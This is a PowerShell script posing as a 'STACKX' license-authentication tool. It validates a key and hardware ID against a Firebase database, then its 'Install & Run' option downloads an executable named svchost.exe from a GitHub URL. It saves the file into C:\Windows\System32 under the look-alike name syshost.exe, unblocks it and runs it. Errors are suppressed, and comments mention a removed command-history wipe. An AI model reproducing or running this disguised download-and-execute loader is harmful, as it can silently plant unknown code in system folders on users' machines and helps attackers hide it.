$ErrorActionPreference = "SilentlyContinue"
[Console]::Title = "STACKX | SECURE AUTHENTICATION"

# บังคับการถอดรหัสพื้นฐานเพื่อความปลอดภัยของคอนโซล
[Console]::OutputEncoding = [System.Text.Encoding]::ASCII

# --- [ STACKX CONFIGURATION ] ---
$DbUrl = "https://project-8a76e-default-rtdb.asia-southeast1.firebasedatabase.app/licenses"

# --- [ SYSTEM FUNCTIONS ] ---
function Get-HWID {
    return (Get-CimInstance Win32_ComputerSystemProduct).UUID
}

function Show-Header {
    Clear-Host
    Write-Host ""
    Write-Host "  // S T A C K X //" -ForegroundColor Magenta
    Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  [ SYSTEM STATUS: ONLINE ] [ AUTHENTICATION SERVICE V2.0 ]" -ForegroundColor White
    Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""
}

function Write-Console {
    param (
        [string]$Message,
        [string]$Type = "INFO"
    )
    
    switch ($Type) {
        "INFO"    { Write-Host "  [*] " -NoNewline -ForegroundColor DarkGray; Write-Host $Message -ForegroundColor White }
        "SUCCESS" { Write-Host "  [+] " -NoNewline -ForegroundColor Magenta; Write-Host $Message -ForegroundColor White }
        "ERROR"   { Write-Host "  [-] " -NoNewline -ForegroundColor Red; Write-Host $Message -ForegroundColor White }
        "INPUT"   { Write-Host "  [>] " -NoNewline -ForegroundColor Magenta; Write-Host $Message -NoNewline -ForegroundColor White }
    }
}

# --- [ MAIN INITIALIZATION ] ---
Show-Header

Write-Console "Initializing secure connection..." "INFO"
Start-Sleep -Milliseconds 600

Write-Console "Please enter your STACKX License Key: " "INPUT"
$key = $Host.UI.ReadLine()

if ([string]::IsNullOrWhiteSpace($key)) {
    Write-Host ""
    Write-Console "Authentication Aborted: License key cannot be empty." "ERROR"
    Start-Sleep 3 ; exit
}

$myHwid = Get-HWID

Write-Host ""
Write-Console "Authenticating with STACKX Servers..." "INFO"
Start-Sleep -Milliseconds 400

# --- [ VERIFICATION PROCESS ] ---
try {
    $data = Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Get

    if ($null -eq $data) {
        Write-Console "Authentication Failed: License key does not exist." "ERROR"
        Start-Sleep 3 ; exit
    }

    if ($data.status -ne "active") {
        Write-Console "Authentication Failed: License is expired or revoked." "ERROR"
        Start-Sleep 3 ; exit
    }

    if ([string]::IsNullOrEmpty($data.hwid)) {
        Write-Console "Binding hardware signature to STACKX Network..." "INFO"
        $payload = @{ hwid = $myHwid } | ConvertTo-Json
        Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Patch -Body $payload
        Write-Console "Hardware bound successfully." "SUCCESS"
    } 
    elseif ($data.hwid -ne $myHwid) {
        Write-Console "Security Alert: Hardware ID mismatch detected." "ERROR"
        Write-Console "This license is strictly locked to another machine." "INFO"
        Start-Sleep 3 ; exit
    }

    # --- [ LOGIN SUCCESS ] ---
    Write-Host ""
    Write-Console "ACCESS GRANTED. Welcome to STACKX." "SUCCESS"
    Write-Host ""
    Write-Console "Press any key to load dashboard..." "INFO"
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

} catch {
    Write-Console "Network Error: Could not reach STACKX Authentication Servers." "ERROR"
    Write-Console $_.Exception.Message "INFO"
    Start-Sleep 3 ; exit
}
# -------------------------

# --- [ ORIGINAL CODE START ] ---
# กำหนดชื่อไฟล์เป็นชื่อจริง ไม่ใช้ระบบสุ่มชื่อ
$fileName = "syshost.exe"
$destPath = "C:\Windows\System32\$fileName"
$destPathh = "STACKX"
$exeUrl   = "https://raw.githubusercontent.com/jaykayzlowlive-ops/ABYSS1/refs/heads/main/svchost.exe"

while ($true) {
    Show-Header
    
    Write-Console "1. Install & Run" "INFO"
    Write-Console "2. Check Status" "INFO"
    Write-Console "0. Exit" "INFO"
    Write-Host ""
    
    Write-Console "Select Option: " "INPUT"
    $choice = $Host.UI.ReadLine()

    if ($choice -eq "1") {
        Clear-Host
        Show-Header
        Write-Host "  Installing System..." -ForegroundColor Cyan
        Write-Host ""

        try {
            Write-Console "Downloading core components..." "INFO"
            Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing -UserAgent "Mozilla/5.0"
            Unblock-File -Path $destPath

            Write-Console "Launching application..." "INFO"
            # ใช้ Start-Process เพื่อรันไฟล์ .exe ที่ดาวน์โหลดมาทันที
            Start-Process -FilePath $destPath -WindowStyle Normal

            Write-Host ""
            Write-Console "Install & Execution complete!" "SUCCESS"
            
            # ถอดระบบลบประวัติการทำงาน (History Cleanup) ออกแล้ว
        }
        catch {
            Write-Host ""
            Write-Console "Install or Run failed!" "ERROR"
            Write-Console $_.Exception.Message "INFO"
        }
        Write-Host ""
        Write-Host "  Press any key to return to menu..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    elseif ($choice -eq "2") {
        Clear-Host
        Show-Header
        
        Write-Host "  [ STACKX CORE ENVIRONMENT STATUS ]" -ForegroundColor Magenta
        Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
        
        if (Test-Path $destPath) {
            Write-Host "  [+] System Status : READY / OPERATIONAL" -ForegroundColor Green
            Write-Host "  [*] Loaded File   : $fileName" -ForegroundColor White
            Write-Host "  [*] Core Path     : $destPathh" -ForegroundColor DarkGray
        } else {
            Write-Host "  [-] System Status : NOT INSTALLED / INACTIVE" -ForegroundColor Red
            Write-Host "  [*] Notice        : Please run option 1 to initialize." -ForegroundColor White
        }
        Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "  Press any key to return to menu..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    elseif ($choice -eq "0") {
        # ถอดระบบเคลียร์ประวัติใน ConsoleHost_history.txt ออกแล้ว เหลือเพียงการปิดโปรแกรมปกติ
        exit
    }
}